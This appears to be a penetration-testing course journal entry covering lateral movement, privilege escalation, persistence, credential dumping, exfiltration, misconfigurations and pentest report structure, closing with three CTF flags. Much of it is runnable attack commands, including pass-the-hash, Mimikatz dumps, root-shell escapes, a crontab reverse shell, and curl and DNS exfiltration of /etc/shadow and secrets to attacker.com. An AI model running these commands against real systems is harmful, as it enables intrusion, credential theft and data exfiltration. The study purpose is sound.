# Day 23 — Post-Compromise Operations

Topics: Lateral Movement, Privilege Escalation, Post-Exploitation, Misconfigurations, Report Writing

**Date:** Saturday June 07, 2026

---

## Overview

Day 23 focused on what happens *after* initial access — the full post-compromise kill chain from foothold to domain domination, and how to document it professionally. The research guide covered five major areas: Lateral Movement, Privilege Escalation, Post-Exploitation, Misconfigurations, and Report Writing.

We also started the VulnCorp CTF challenge and captured the first 3 flags before the end of the day.

---

## 1. Lateral Movement (MITRE TA0008)

Lateral movement is horizontal movement through a network after gaining an initial foothold. The goal: reach higher-value targets while avoiding detection.

**MITRE ATT&CK:** TA0008 — Techniques include T1021 (Remote Services), T1550 (Use Alternate Auth Material), T1570 (Lateral Tool Transfer).

**Attack chain:**
```
Initial Access → Foothold (user shell) → Recon (net scan) → Cred Harvest (mimikatz) → Pivot (PTH/PsExec) → DC Access (domain admin)
```

### Pass-the-Hash (PtH)
NTLM uses the hash, not the plaintext password. Steal the hash → authenticate as that user without cracking it.

```bash
# Dump hashes (on compromised Windows host)
mimikatz # sekurlsa::logonpasswords

# PtH with CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator \
  -H aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  --exec-method smbexec -x "whoami"

# PtH with Impacket
impacket-psexec Administrator@192.168.1.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

### PsExec / SMB Execution
PsExec creates a service on the remote host and runs commands through it. Requires `ADMIN$` share access.

```bash
impacket-psexec domain/user:password@192.168.1.10   # SYSTEM shell
impacket-smbexec domain/user:password@192.168.1.10  # lower footprint, no binary upload
crackmapexec smb 192.168.1.10 -u user -p password   # verify access first
```

### RDP Hijacking
Hijack disconnected RDP sessions on Windows — no password needed if you have SYSTEM.

```cmd
# List sessions
query session

# Hijack session 2 from SYSTEM
tscon 2 /dest:rdp-tcp#0
```

### WMI / WinRM
```bash
# WMI remote execution
wmic /node:192.168.1.10 /user:admin /password:pass process call create "cmd.exe /c whoami"

# WinRM with Evil-WinRM (gives PSRemoting shell)
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
```

### SSH Pivoting (Linux)
```bash
# Dynamic SOCKS proxy — route all traffic through compromised host
ssh -D 9050 user@pivot-host
proxychains nmap -sT 10.10.10.0/24

# Local port forward — access internal service
ssh -L 8080:internal-server:80 user@pivot-host

# Remote port forward — expose your listener through target
ssh -R 4444:localhost:4444 user@pivot-host
```

---

## 2. Privilege Escalation

Moving from low-privileged user to root/SYSTEM.

### Linux — SUID Binaries
SUID bit means the binary runs as its owner (often root), even when executed by a regular user.

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for abuse
# Example: nmap with SUID
nmap --interactive
!sh  # drops root shell
```

### Linux — Sudo Misconfiguration
```bash
sudo -l  # list what current user can run as sudo

# If (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!bash'

# If (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit
```

### Linux — Capabilities
```bash
getcap -r / 2>/dev/null
# If python3 has cap_setuid: python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### Windows — Token Impersonation
If you have `SeImpersonatePrivilege` (common on service accounts):
```
# JuicyPotato, PrintSpoofer, RoguePotato
PrintSpoofer.exe -i -c cmd
```

### Windows — Kernel Exploits
```bash
systeminfo  # get patch level
# Run Windows Exploit Suggester against output
python windows-exploit-suggester.py --database 2024.msi --systeminfo sysinfo.txt
```

---

## 3. Post-Exploitation

What you do after you have privileged access.

### Persistence

**Linux:**
```bash
# Crontab backdoor
echo "* * * * * /bin/bash -i >& /dev/tcp/10.10.10.1/4444 0>&1" >> /etc/crontab

# SSH authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Systemd service (stealthy)
# Create /etc/systemd/system/backdoor.service
```

**Windows:**
```cmd
# Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\evil.exe"

# Scheduled task
schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\evil.exe"
```

### Credential Dumping

```bash
# Linux: /etc/shadow
cat /etc/shadow | grep -v '*\|!'
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt wordlist.txt

# Windows: LSASS dump with Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Windows: SAM + SYSTEM offline
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

### C2 Frameworks
- **Metasploit** — modules, Meterpreter sessions, post-exploitation built-in
- **Cobalt Strike** — industry standard; Beacons for C2 communication
- **Sliver** — open source, mTLS/HTTP/DNS channels
- **Havoc** — modern open-source alternative to CS

### Exfiltration
```bash
# DNS exfil (bypasses many firewalls)
for chunk in $(cat secret.txt | base64 | fold -w 30); do dig $chunk.attacker.com; done

# HTTP POST to attacker server
curl -X POST http://attacker.com/upload -F "file=@/etc/shadow"

# ICMP (low and slow)
ping -p $(xxd -p secret.txt | head -c 16) attacker.com
```

---

## 4. Common Misconfigurations

### SMB / NFS
```bash
# Enumerate SMB shares (no auth)
smbclient -L //192.168.1.10 -N
crackmapexec smb 192.168.1.0/24 --shares

# List NFS exports
showmount -e 192.168.1.10
# If root_squash is off: mount and write SSH keys as root
mount -t nfs 192.168.1.10:/export /mnt/nfs
```

### Active Directory Misconfigurations
| Misconfiguration | Attack | Tool |
|---|---|---|
| Kerberoasting | Request TGS for SPN, crack offline | `impacket-GetUserSPNs` |
| AS-REP Roasting | Users with no pre-auth, crack hash | `impacket-GetNPUsers` |
| Unconstrained Delegation | Capture TGT of connecting user | `Rubeus monitor` |
| LAPS not deployed | Local admin password reuse | `crackmapexec --laps` |
| BloodHound attack paths | Find ACL-based privesc paths | `SharpHound` + `BloodHound` |

### Web / API Misconfigurations
| Misconfiguration | Impact | Quick Check |
|---|---|---|
| Directory listing enabled | Source code / config exposure | `GET /uploads/` |
| Default credentials | Admin takeover | admin:admin, admin:password |
| Exposed `.git` | Full source code dump | `GET /.git/config` |
| phpinfo() exposed | Full environment disclosure | `GET /phpinfo.php` |
| S3 bucket public read/write | Data exfil / content injection | `aws s3 ls s3://bucket --no-sign-request` |
| SSRF + metadata endpoint | Cloud credentials via 169.254.169.254 | Fetch internal URLs via user-controlled input |

---

## 5. Report Writing

> A pentest without a report is just hacking. The report is the deliverable.

### Professional Report Structure
1. **Cover Page** — Target, date, tester, classification, version
2. **Executive Summary** — Non-technical. 1–2 pages. Overall risk rating, narrative of what an attacker could do, top 3–5 recommendations.
3. **Scope & Methodology** — What was tested, what was out of scope, framework (PTES/OWASP), tools used, test type (black/gray/white box)
4. **Technical Findings** — One structured entry per vulnerability (see format below)
5. **Appendices** — Raw scan output, tool configs, attack chain diagram, remediation tracker

### Per-Finding Format
| Field | Description |
|---|---|
| Finding ID | VULN-001, VULN-002... |
| Title | Short descriptive name |
| Severity | CRITICAL / HIGH / MEDIUM / LOW / INFO |
| CVSS Score | e.g., 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| Affected Asset | IP, hostname, URL, component |
| Description | What the vulnerability is and why it exists |
| Impact | What an attacker can do — business impact |
| Proof of Concept | Step-by-step reproduction with screenshots |
| Remediation | Specific, actionable fix |
| References | CVE, CWE, vendor advisories |

### CVSS v3.1 Scoring
| Metric | Options |
|---|---|
| Attack Vector (AV) | Network / Adjacent / Local / Physical |
| Attack Complexity (AC) | Low / High |
| Privileges Required (PR) | None / Low / High |
| User Interaction (UI) | None / Required |
| Confidentiality (C) | None / Low / High |
| Integrity (I) | None / Low / High |
| Availability (A) | None / Low / High |

**Score ranges:** 0.0 = None · 0.1–3.9 = Low · 4.0–6.9 = Medium · 7.0–8.9 = High · 9.0–10.0 = Critical

### Two-Audience Rule
Write for two readers at once:
- **Executive summary** → CEO who doesn't know what SSH is
- **Technical findings** → Sysadmin who will actually fix the issue

Both need to understand the risk, just at different levels.

---

## VulnCorp CTF — Early Start (3 Flags)

Started the VulnCorp Internal Portal CTF at the end of Day 23. Initial recon phase yielded the first 3 flags:

| # | Flag | Vector |
|---|---|---|
| 1 | `FLAG{p4ss1v3_r3c0n_m3t4d4t4_l34k}` | X-Debug-Token HTTP response header |
| 2 | `FLAG{r3c0n_m4st3r_r0b0ts_txt}` | robots.txt comment |
| 3 | `FLAG{1d0r_ch4mp_acc3ss_d3n13d_lol}` | IDOR on /api/user/2 (alice's notes) |

Full engagement continued on Day 24.
